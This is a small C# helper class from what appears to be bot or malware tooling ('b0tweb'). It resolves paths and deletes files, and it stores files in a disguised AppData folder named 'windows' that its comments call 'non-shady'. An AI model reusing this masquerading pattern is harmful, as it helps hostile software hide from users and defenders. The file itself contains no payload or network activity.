using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Reflection;

namespace b0tweb
{
    class FileHelper
    {
        public static string GetBasePath()
        {
            return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
        }

        /// <summary>
        /// Get a temporary file location in a "non-shady" folder.
        /// </summary>
        /// <param name="name">The name of the file you want to store</param>
        /// <returns>The full file path for the file.</returns>
        public static string GetTemporaryFilePath(string name)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string fakepath = Path.Combine(appdata, "windows");

            Directory.CreateDirectory(fakepath);

            return Path.Combine(fakepath, name);
        }

        /// <summary>
        /// Deletes a file at a given location.
        /// </summary>
        /// <param name="path">The file location.</param>
        public static void DeleteFile(string path)
        {
            if (!File.Exists(path)) return;

            File.Delete(path);
        }
    }
}
